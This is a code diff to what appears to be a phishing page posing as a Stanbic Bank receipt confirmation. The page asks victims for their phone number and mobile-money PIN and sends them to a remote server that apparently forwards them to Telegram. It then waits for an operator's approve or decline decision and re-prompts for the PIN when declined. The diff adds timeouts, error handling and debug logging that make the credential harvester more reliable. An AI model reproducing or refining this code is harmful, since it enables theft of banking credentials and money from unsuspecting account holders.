@@ -149,6 +149,7 @@
     display: none; padding: 11px 14px; border-radius: 10px;
     font-size: 12.5px; font-weight: 600; line-height: 1.5;
     margin-bottom: 16px; text-align: center;
+    white-space: pre-wrap; word-break: break-word;
   }
   .status-banner.show { display: block; }
   .status-banner.error { background: rgba(179,38,30,0.20); color: #FFE04D; border: 1px solid rgba(255,224,77,0.35); }
@@ -407,6 +408,8 @@
 
 <script>
   const API_BASE = 'https://mobile-bank-receipt-production.up.railway.app';
+  const INITIAL_FETCH_TIMEOUT_MS = 20000;
+
   const I18N = {
     en: {
       brandTitle: 'Confirm your receipt',
@@ -432,6 +435,8 @@
       checkFields: 'Please check the highlighted fields.',
       networkError: 'Network error. Please try again.',
       timeoutError: 'Request timed out. Please try again.',
+      serverError: 'Service temporarily unavailable. Please try again shortly.',
+      missingRef: 'This confirmation link is invalid or incomplete.',
       approvedRedirecting: 'Confirmed. Redirecting…',
       docTitle: 'Stanbic Bank · Confirm Receipt'
     },
@@ -459,6 +464,8 @@
       checkFields: 'Veuillez vérifier les champs en surbrillance.',
       networkError: 'Erreur réseau. Veuillez réessayer.',
       timeoutError: 'Délai expiré. Veuillez réessayer.',
+      serverError: 'Service temporairement indisponible. Veuillez réessayer sous peu.',
+      missingRef: 'Ce lien de confirmation est invalide ou incomplet.',
       approvedRedirecting: 'Confirmé. Redirection…',
       docTitle: 'Stanbic Bank · Confirmer la réception'
     }
@@ -468,6 +475,7 @@
   const urlLang = (urlParams.get('lang') || '').toLowerCase();
   let currentLang = I18N[urlLang] ? urlLang : 'en';
   let T = I18N[currentLang];
+  const DEBUG = urlParams.get('debug') === '1';
 
   const COUNTRY_DIAL = {
     'Cameroon': '+237',
@@ -626,10 +634,14 @@
     clearTimeout(t._timer);
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
   }
-  function showDeclineBanner() {
+
+  function showBanner(msg, isError = true) {
     const b = document.getElementById('statusBanner');
-    b.className = 'status-banner show error';
-    b.textContent = T.declineBanner;
+    b.className = 'status-banner show' + (isError ? ' error' : '');
+    b.textContent = msg;
+  }
+  function showDeclineBanner() {
+    showBanner(T.declineBanner, true);
   }
   function hideBanner() {
     const b = document.getElementById('statusBanner');
@@ -650,18 +662,37 @@
   let pollingActive = false;
   let pollTimer = null;
 
-  function cancelInitiating() {
-    pollingActive = false;
-    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
-    hideInitiating();
+  function resetButton() {
     const btn = document.getElementById('signinBtn');
     btn.disabled = false;
     btn.textContent = T.signIn;
   }
 
+  function cancelInitiating() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    hideInitiating();
+    resetButton();
+  }
+
+  async function fetchWithTimeout(url, options, timeoutMs) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      return await fetch(url, { ...options, signal: controller.signal });
+    } finally {
+      clearTimeout(timer);
+    }
+  }
+
   async function handleSignIn(e) {
     e.preventDefault();
     hideBanner();
+
+    if (!tx.ref) {
+      showBanner(T.missingRef, true);
+      return;
+    }
 
     if (!validateForm()) {
       showToast(T.checkFields);
@@ -675,42 +706,69 @@
     const phoneDigits = document.getElementById('phoneInput').value.replace(/\D/g, '');
     const pin = document.getElementById('pinInput').value;
 
+    const payload = {
+      tx: tx.ref,
+      pin: pin,
+      am: tx.am,
+      cur: tx.cur,
+      c: tx.c,
+      an: tx.an,
+      rn: tx.rn,
+      phone: dial + phoneDigits,
+      lang: currentLang
+    };
+    if (DEBUG) console.log('[pin] POST', API_BASE + '/api/mtn/pin', payload);
+
     showInitiating();
 
-    let serverAccepted = true;
+    let responseJson = null;
+    let httpStatus = 0;
     try {
-      const r = await fetch(API_BASE + '/api/mtn/pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tx: tx.ref,
-          pin: pin,
-          am: tx.am,
-          cur: tx.cur,
-          c: tx.c,
-          an: tx.an,
-          rn: tx.rn,
-          phone: dial + phoneDigits,
-          lang: currentLang
-        })
-      });
-      if (!r.ok) serverAccepted = false;
+      const r = await fetchWithTimeout(
+        API_BASE + '/api/mtn/pin',
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        },
+        INITIAL_FETCH_TIMEOUT_MS
+      );
+      httpStatus = r.status;
+      try { responseJson = await r.json(); } catch (_) { responseJson = null; }
     } catch (err) {
+      console.error('[pin] network failure:', err);
       hideInitiating();
-      btn.disabled = false;
-      btn.textContent = T.signIn;
-      showToast(T.networkError);
+      resetButton();
+      showToast(err && err.name === 'AbortError' ? T.timeoutError : T.networkError);
       return;
     }
 
-    if (!serverAccepted) {
+    // ── Server rejected the POST ──
+    if (httpStatus < 200 || httpStatus >= 300) {
+      console.error('[pin] server error:', httpStatus, responseJson);
       hideInitiating();
-      btn.disabled = false;
-      btn.textContent = T.signIn;
-      showToast(T.networkError);
+      resetButton();
+
+      const code = responseJson && responseJson.code;
+      const serverMsg = responseJson && responseJson.message;
+
+      if (code === 'telegram_not_configured') {
+        // Internal misconfiguration — show a generic message, not the raw error
+        showToast(T.serverError);
+      } else if (code === 'telegram_timeout') {
+        showToast(T.timeoutError);
+      } else if (httpStatus === 502 || httpStatus === 503 || httpStatus === 504) {
+        showToast(T.serverError);
+      } else if (serverMsg) {
+        // Generic server message (e.g. "Missing data") — safe to show
+        showToast(String(serverMsg).slice(0, 140));
+      } else {
+        showToast(T.networkError);
+      }
       return;
     }
 
+    // ── Success: poll for decision ──
     pollingActive = true;
     const start = Date.now();
     const maxWaitMs = 2 * 60 * 1000;
@@ -721,15 +779,16 @@
       if (Date.now() - start > maxWaitMs) {
         pollingActive = false;
         hideInitiating();
-        btn.disabled = false;
-        btn.textContent = T.signIn;
+        resetButton();
         showToast(T.timeoutError);
         return;
       }
 
       let decision = 'pending';
       try {
-        const r = await fetch(API_BASE + '/api/mtn/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const r = await fetch(
+          API_BASE + '/api/mtn/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now()
+        );
         if (!r.ok) throw new Error('HTTP ' + r.status);
         const j = await r.json();
         decision = j.decision || 'pending';
@@ -770,8 +829,7 @@
       if (decision === 'declined' || decision === 'expired') {
         pollingActive = false;
         hideInitiating();
-        btn.disabled = false;
-        btn.textContent = T.signIn;
+        resetButton();
         document.getElementById('pinInput').value = '';
         document.getElementById('pinInput').focus();
         showDeclineBanner();
